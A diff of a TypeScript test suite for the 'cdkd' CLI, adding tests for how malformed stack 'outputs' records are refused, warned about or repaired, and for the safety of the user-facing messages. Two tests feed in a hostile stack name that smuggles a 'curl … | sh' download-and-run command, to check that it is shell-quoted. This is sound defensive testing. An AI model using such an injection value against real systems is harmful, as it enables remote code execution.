@@ -4,12 +4,16 @@ import { fileURLToPath } from 'node:url';
 import { dirname, join } from 'node:path';
 import {
   STATE_RESOURCES_MALFORMED,
+  hasReadableOutputs,
   hasReadableResources,
   isReadableBag,
+  malformedExportSourceWarning,
+  malformedOutputsRefusalMessage,
   malformedOutputsWarning,
   malformedRenderedContainersWarning,
   malformedResourcesWarning,
   malformedStateRefusalMessage,
+  refuseMalformedOutputs,
   refuseMalformedState,
   repairMalformedOutputsForReadOnly,
   repairMalformedResourcesForReadOnly,
@@ -193,6 +197,188 @@ describe('repairMalformedOutputsForReadOnly (issue go-to-k/cdkd#3189)', () => {
       }
       expect(outputsVerdict, label).toBe(resourcesVerdict);
     }
+  });
+});
+
+/**
+ * The WRITE-capable half of the `outputs` container (issue go-to-k/cdkd#3192)
+ * — the opposite answer from `repairMalformedOutputsForReadOnly` above, for
+ * the same shapes, and the asymmetry IS the fix: repairing a bag and then
+ * saving it is the laundering this refusal exists to stop.
+ */
+describe('refuseMalformedOutputs + hasReadableOutputs (issue go-to-k/cdkd#3192)', () => {
+  const HEALTHY_RESOURCES = {
+    R: { physicalId: 'p', resourceType: 'AWS::S3::Bucket', properties: { Name: 'b' } },
+  };
+
+  function withOutputs(outputs: unknown): StackState {
+    const s = state(structuredClone(HEALTHY_RESOURCES));
+    s.outputs = outputs as StackState['outputs'];
+    return s;
+  }
+
+  /** The shared table MINUS `absent`, which this half exempts — see below. */
+  const UNREADABLE_OUTPUTS = UNREADABLE.filter(([label]) => label !== 'absent');
+
+  for (const [label, value] of UNREADABLE_OUTPUTS) {
+    it(`REFUSES ${label} with the shared code`, () => {
+      let thrown: unknown;
+      try {
+        refuseMalformedOutputs(withOutputs(value), 'MyStack', 'eu-west-1');
+      } catch (err) {
+        thrown = err;
+      }
+      expect(thrown, `a ${label} outputs bag was not refused`).toBeInstanceOf(CdkdError);
+      expect((thrown as CdkdError).code).toBe(STATE_RESOURCES_MALFORMED);
+      expect((thrown as CdkdError).message).toBe(
+        malformedOutputsRefusalMessage('MyStack', 'eu-west-1')
+      );
+    });
+  }
+
+  it('FLOOR: a populated, an empty and an ABSENT bag all pass through', () => {
+    // The other side of the fence, without which "refuses what it must" says
+    // nothing: a guard that threw on everything would satisfy every case
+    // above. The absent row is the one that would break real records — a
+    // deploy's failure-path save writes `outputs: currentState.outputs`, which
+    // `JSON.stringify` DROPS when undefined, and `cdkd scrub` round-trips such
+    // a record deliberately.
+    expect(() => refuseMalformedOutputs(withOutputs({ A: 'a' }), 'S', 'r')).not.toThrow();
+    expect(() => refuseMalformedOutputs(withOutputs({}), 'S', 'r')).not.toThrow();
+    expect(() => refuseMalformedOutputs(withOutputs(undefined), 'S', 'r')).not.toThrow();
+  });
+
+  it('refuses on the `outputs` bag ALONE, with the resource map intact', () => {
+    // The two containers are independent, so the outputs refusal must not need
+    // a damaged resource map to fire — and `refuseMalformedState` must not fire
+    // on this record either, or the user would be told not to run
+    // `cdkd deploy` for a reason that does not hold. Both directions pinned,
+    // because collapsing the two calls into one is the obvious "simplification".
+    const s = withOutputs('abcdef');
+    expect(() => refuseMalformedState(s, 'S', 'r')).not.toThrow();
+    expect(() => refuseMalformedOutputs(s, 'S', 'r')).toThrow();
+
+    const other = state(null);
+    other.outputs = { A: 'a' };
+    expect(() => refuseMalformedOutputs(other, 'S', 'r')).not.toThrow();
+    expect(() => refuseMalformedState(other, 'S', 'r')).toThrow();
+  });
+
+  it('never MUTATES the record it refuses — the evidence is what it protects', () => {
+    // A refusal that repaired on its way out would lose exactly what it is
+    // there to preserve, and the caller holds the same object.
+    const s = withOutputs('abcdef');
+    expect(() => refuseMalformedOutputs(s, 'S', 'r')).toThrow();
+    expect(s.outputs).toBe('abcdef' as unknown as StackState['outputs']);
+  });
+
+  it('agrees with the read-only half on every shape, opposite verdicts aside', () => {
+    // One predicate under both, so the write-capable and read-only answers
+    // cannot come to differ about whether a given record is damaged — only
+    // about what to DO. `hasReadableOutputs` is the shared test; this walks the
+    // two exported entry points over it.
+    for (const [label, value] of UNREADABLE) {
+      const readable = hasReadableOutputs(withOutputs(value));
+      const repaired = repairMalformedOutputsForReadOnly(withOutputs(value));
+      let refused = false;
+      try {
+        refuseMalformedOutputs(withOutputs(value), 'S', 'r');
+      } catch {
+        refused = true;
+      }
+      expect(repaired, label).toBe(!readable);
+      expect(refused, label).toBe(!readable);
+    }
+  });
+});
+
+describe('the malformed-outputs REFUSAL text (issue go-to-k/cdkd#3192)', () => {
+  it('names the container, the write, and the shared-index blast radius', () => {
+    const m = malformedOutputsRefusalMessage('S', 'us-east-1');
+    expect(m).toContain(`'outputs'`);
+    expect(m).toContain('can WRITE state');
+    // The sentence that makes this text different from the `resources`
+    // refusal, which is about re-CREATING a stack. Here the resource map is
+    // intact and what is at stake is the region-wide exports index.
+    expect(m).toContain('exports index');
+    // ...and it must NOT borrow the resources text's remedy advice, which
+    // would attach a do-not-deploy warning to a stack whose resources are fine.
+    expect(m).not.toContain('re-CREATE');
+    expect(m).not.toContain(`'resources'`);
+  });
+
+  it('shell-quotes a hostile stack name and emits the command LAST', () => {
+    const evil = "a'; curl http://x|sh; echo '";
+    const m = malformedOutputsRefusalMessage(evil, 'us-east-1');
+    // The command this text tells a user to PASTE must not be closable by the
+    // name interpolated into it.
+    expect(m).not.toContain(`${evil} --stack-region`);
+    expect(m).toContain('cdkd state show');
+    expect(m.split('\n')).toHaveLength(1);
+  });
+
+  it('renders an identifier that sanitizes to EMPTY as a placeholder', () => {
+    const controlOnly = String.fromCharCode(0x00, 0x01);
+    expect(malformedOutputsRefusalMessage(controlOnly, 'us-east-1')).toContain(UNRENDERABLE);
+  });
+
+  it('CAPS a multi-kilobyte name so the remedy command stays on screen', () => {
+    // The cap is inherited from this module's own `safeIdentifier` (which in
+    // turn uses the shared `truncateCodePoints`), and inheritance is exactly
+    // what stops being true when someone inlines a helper — so each new
+    // message gets its own case (review of go-to-k/cdkd#3206). A stack name
+    // can arrive from an S3 key, so this is reachable rather than theoretical.
+    // Asserted as a DISTANCE, not `endsWith`: the template satisfies an
+    // endsWith check with or without a cap.
+    const long = malformedOutputsRefusalMessage('q'.repeat(5000), 'us-east-1');
+    expect(long).toContain(`${'q'.repeat(128)}...`);
+    expect(long).toContain('cdkd state show');
+    expect(long.length).toBeLessThan(1500);
+  });
+});
+
+describe('the malformed export-SOURCE warning (issue go-to-k/cdkd#3192)', () => {
+  it('says the rebuild CONTINUES and names the symptom a reader will meet', () => {
+    const w = malformedExportSourceWarning('Producer', 'us-east-1');
+    expect(w).toContain('Producer');
+    expect(w).toContain(`'exportNames'`);
+    // The distinguishing sentence: the failure shows up in a DIFFERENT stack,
+    // naming the consumer, so this line is the only place the damaged producer
+    // is named at all.
+    expect(w).toContain('CONSUMER');
+    expect(w).toContain('Continuing');
+    // And it must not read as a refusal — the index serves every producer in
+    // the region and aborting over one record would take them all down.
+    expect(w).not.toContain('refuses');
+  });
+
+  it('is a DIFFERENT text from its two outputs siblings', () => {
+    // Three texts for one container is deliberate; a future edit that
+    // collapses any pair loses the consequence each states.
+    const source = malformedExportSourceWarning('S', 'us-east-1');
+    expect(source).not.toBe(malformedOutputsWarning('S', 'us-east-1'));
+    expect(source).not.toBe(malformedOutputsRefusalMessage('S', 'us-east-1'));
+    expect(malformedOutputsWarning('S', 'us-east-1')).not.toBe(
+      malformedOutputsRefusalMessage('S', 'us-east-1')
+    );
+  });
+
+  it('shell-quotes a hostile identifier and stays on one line', () => {
+    const evil = "a'; curl http://x|sh; echo '";
+    const w = malformedExportSourceWarning(evil, 'us-east-1');
+    expect(w).not.toContain(`${evil} --stack-region`);
+    expect(w.split('\n')).toHaveLength(1);
+    expect(malformedExportSourceWarning(String.fromCharCode(0x00), 'r')).toContain(UNRENDERABLE);
+  });
+
+  it('CAPS a multi-kilobyte producer name too', () => {
+    // Same reason as the refusal's own cap case, and this one matters more:
+    // the producer name here comes off an S3 KEY during a rebuild, with no
+    // user in the loop to have typed it.
+    const long = malformedExportSourceWarning('q'.repeat(5000), 'us-east-1');
+    expect(long).toContain(`${'q'.repeat(128)}...`);
+    expect(long).toContain('cdkd state show');
+    expect(long.length).toBeLessThan(1500);
   });
 });
 
@@ -508,6 +694,25 @@ describe('the user-facing text', () => {
       branch.indexOf('malformedRecords.length > 0'),
       'the finding is raised BELOW `options.fail`, so ScrubNeededError (exit 1, silent) fires ' +
         'first and reports "scrub found a leak" for a record scrub could not read.'
+    ).toBeLessThan(branch.indexOf('if (options.fail)'));
+
+    // The `outputs` half gets BOTH assertions too (review of
+    // go-to-k/cdkd#3206). Its first cut asserted only that the identifier
+    // appeared SOMEWHERE IN THE FILE, and the reviewer measured the cost:
+    // splitting the throw so the outputs arm sat BELOW `if (options.fail)`
+    // left 107 of 107 cases green while re-introducing #3018's round-1 defect
+    // for the new container — `--dry-run --fail` over an unreadable outputs
+    // bag exiting 1 through the SILENT ScrubNeededError, with the
+    // audited-record message never printed.
+    expect(
+      branch,
+      'the malformed-OUTPUTS finding is not raised inside the --dry-run branch, so it never ' +
+        'runs: that branch returns.'
+    ).toContain('malformedOutputRecords.length > 0');
+    expect(
+      branch.indexOf('malformedOutputRecords.length > 0'),
+      'the outputs finding is raised BELOW `options.fail`, so ScrubNeededError (exit 1, silent) ' +
+        'fires first and reports "scrub found a leak" for outputs scrub could not read.'
     ).toBeLessThan(branch.indexOf('if (options.fail)'));
   });
 });
@@ -856,6 +1061,174 @@ describe('write-capable commands refuse; read-only ones repair', () => {
         `lookups still run against the unrepaired container — the shape go-to-k/cdkd#3018's ` +
         `first cut shipped for the resources bag.`
     ).toBeLessThan(derefIndex);
+  });
+
+  /**
+   * The `outputs` bag's WRITE-capable half (go-to-k/cdkd#3192) — the same
+   * enumeration the `resources` cases above carry, so a new site cannot be
+   * added on the wrong side of the refuse-versus-repair rule for one container
+   * while satisfying it for the other.
+   *
+   * The population is the write-capable files that READ or REBUILD the bag,
+   * which is NOT the same set as `REFUSE` above. `rollback.ts` is the
+   * difference and is excluded deliberately: `grep -n outputs
+   * src/cli/commands/rollback.ts` returns NOTHING — it spreads `...baseState`,
+   * carrying the field by value — so a guard there would protect nothing, and
+   * an unfalsifiable guard fences nothing. The membership case below pins that
+   * premise rather than leaving it in a comment.
+   */
+  const OUTPUTS_REFUSE = [
+    'src/cli/commands/scrub.ts',
+    'src/cli/commands/import.ts',
+    'src/cli/commands/orphan.ts',
+  ];
+
+  /**
+   * The FIRST expression in each file that reads or carries the `outputs` bag.
+   * The refusal has to DOMINATE it — the round-1 defect of go-to-k/cdkd#3018
+   * was a guard sitting below the dereference it meant to protect, and a fence
+   * that only checks the call exists stays green through exactly that move.
+   */
+  const FIRST_OUTPUTS_USE: Record<string, string> = {
+    // The `isOutputSuppressed(...)` read in the Export.Name resolve loop —
+    // TIGHTENED from `Object.keys(state.outputs` (review of
+    // go-to-k/cdkd#3206), which sits ~5,500 stripped characters LATER, so a
+    // guard moved between the two would have kept this fence green while the
+    // bag was already read. Both are inside `scrubStack`; the earlier one is
+    // the dominance question.
+    'src/cli/commands/scrub.ts': 'state.outputs ?? {}',
+    // The state literal that carries the bag into `saveState`.
+    'src/cli/commands/import.ts': 'existingState?.outputs',
+    // `rewriteResourceReferences`, which rebuilds the bag from
+    // `Object.entries(state.outputs ?? {})` in `src/analyzer/orphan-rewriter.ts`.
+    'src/cli/commands/orphan.ts': 'rewriteResourceReferences(',
+  };
+
+  it('rollback.ts is OUT of the outputs population because it reads no outputs', () => {
+    // The premise of the exclusion, asserted rather than assumed. If this file
+    // ever starts reading or rebuilding the bag, it joins `OUTPUTS_REFUSE` —
+    // it already calls `saveState`, so the refuse side is settled for it.
+    const src = code('src/cli/commands/rollback.ts');
+    expect(
+      src.includes('.outputs'),
+      'src/cli/commands/rollback.ts now reads `outputs`. It calls saveState, so it must refuse a ' +
+        'malformed bag: add it to OUTPUTS_REFUSE with its first dereference as the anchor.'
+    ).toBe(false);
+    expect(src, 'rollback.ts no longer calls saveState').toContain('saveState(');
+  });
+
+  for (const file of OUTPUTS_REFUSE) {
+    it(`${file} REFUSES a malformed \`outputs\` bag — it can saveState`, () => {
+      const src = code(file);
+      // TWO spellings, exactly as the resources half: most files call the
+      // shared helper; `scrub` branches on the exported predicate and raises
+      // its OWN exit-2 class, because its exit 1 is spoken for.
+      const refuses =
+        src.includes('refuseMalformedOutputs(') ||
+        (src.includes('hasReadableOutputs(') && src.includes('malformedOutputsRefusalMessage('));
+      expect(
+        refuses,
+        `${file} calls saveState and reads the outputs bag, so a malformed one must be REFUSED, ` +
+          `not repaired: this command rebuilds the bag before saving, so a string is written ` +
+          `back as a well-formed map and the damaged record is laundered permanently. Call ` +
+          `refuseMalformedOutputs(), or branch on hasReadableOutputs() and raise your own class ` +
+          `around malformedOutputsRefusalMessage().`
+      ).toBe(true);
+
+      // Only `scrub` may ALSO hold the repair helper, and only because its
+      // write gate proves `--dry-run` cannot persist. The same carve-out, and
+      // the same reason, as the resources half one describe up.
+      if (file !== 'src/cli/commands/scrub.ts') {
+        expect(
+          src.includes('repairMalformedOutputsForReadOnly'),
+          `${file} repairs a malformed outputs bag but can also WRITE state.`
+        ).toBe(false);
+      } else {
+        // The repair must not be able to end in a CLEAN verdict: the finding
+        // has to reach a non-zero exit, or `--dry-run --fail` reports a stack
+        // clean whose stored outputs it never read.
+        expect(
+          src,
+          'scrub no longer carries the outputs repair out to its caller; `--dry-run --fail` ' +
+            'would exit 0 over a record whose outputs it replaced with {}.'
+        ).toContain('malformedOutputs');
+        expect(
+          src,
+          'the outputs finding no longer reaches the audited-record refusal.'
+        ).toContain('malformedOutputRecords.length > 0');
+      }
+
+      expect(src, `${file} no longer calls saveState`).toContain('saveState(');
+
+      // `scrub` additionally LISTS the records it could not certify, in an
+      // audited-record refusal raised above `scrubStack`'s seam — so no
+      // behavioural case in this repo reaches it, and it interpolated stack
+      // names RAW from go-to-k/cdkd#3018 until go-to-k/cdkd#3206's review. A
+      // source fence is what fits: the names must go through the SHARED
+      // `safeIdentifier` (sanitize + 128-code-point cap + `UNRENDERABLE`), not
+      // a bare `.join`, and not a local half-copy that sanitizes without
+      // capping — which is exactly what the first fix shipped.
+      if (file === 'src/cli/commands/scrub.ts') {
+        expect(
+          src,
+          'scrub lists malformed records with a bare join, so a stack name reaches the refusal ' +
+            'unsanitized and uncapped.'
+        ).not.toMatch(/\$\{(stackNames|outputStackNames)\.join\(/);
+        // Anchored on the ARROW BODY, not a bare identifier: `src` is
+        // comment-stripped, but the name also appears in ordinary code
+        // elsewhere in the file, so a bare `toContain` would be satisfied by a
+        // use that has nothing to do with this list (round-4 nit).
+        expect(
+          src,
+          'scrub no longer renders the audited-record name list through a sanitizing, capping, ' +
+            'BOUNDED helper, so a stack name can reach the refusal unbounded — or, hand-quoted, ' +
+            'forge extra list entries.'
+        ).toMatch(/names\.map\(\(n\) => displayIdent\(n\)\)/);
+      }
+
+      // DOMINANCE.
+      const refusalAt = Math.max(
+        src.indexOf('refuseMalformedOutputs('),
+        src.indexOf('hasReadableOutputs(')
+      );
+      const derefAt = FIRST_OUTPUTS_USE[file]!;
+      const derefIndex = src.indexOf(derefAt);
+      expect(
+        derefIndex,
+        `${file} no longer contains its first outputs use \`${derefAt}\`; this fence's anchor ` +
+          `is stale and it is no longer checking dominance.`
+      ).toBeGreaterThan(-1);
+      expect(
+        refusalAt,
+        `${file} refuses AFTER its first \`outputs\` use (\`${derefAt}\`), so the bag is already ` +
+          `read — or rebuilt — one line above the refusal.`
+      ).toBeLessThan(derefIndex);
+    });
+  }
+
+  /**
+   * The exports index takes NEITHER answer, and the third disposition is the
+   * per-site decision go-to-k/cdkd#3192 exists to make rather than an omission.
+   */
+  it('src/state/export-index-store.ts fails CLOSED and SAYS so, refusing nothing', () => {
+    const src = code('src/state/export-index-store.ts');
+    expect(
+      src.includes('hasReadableExportSet('),
+      `the exports-index rebuild no longer tests the producer record's export set, so a ` +
+        `hand-edited one publishes a fabricated export per character into the shared index.`
+    ).toBe(true);
+    expect(
+      src.includes('malformedExportSourceWarning('),
+      `the exports-index rebuild drops a damaged producer SILENTLY. An empty contribution is ` +
+        `indistinguishable from a stack that exports nothing, so the next Fn::ImportValue miss ` +
+        `names the CONSUMER and nothing ever names this record.`
+    ).toBe(true);
+    // And it must NOT refuse: this rebuild serves every producer in the region.
+    expect(
+      src.includes('refuseMalformedOutputs('),
+      `the exports-index rebuild now REFUSES on a malformed record, which takes every other ` +
+        `stack's Fn::ImportValue resolution down with it.`
+    ).toBe(false);
   });
 
   /**
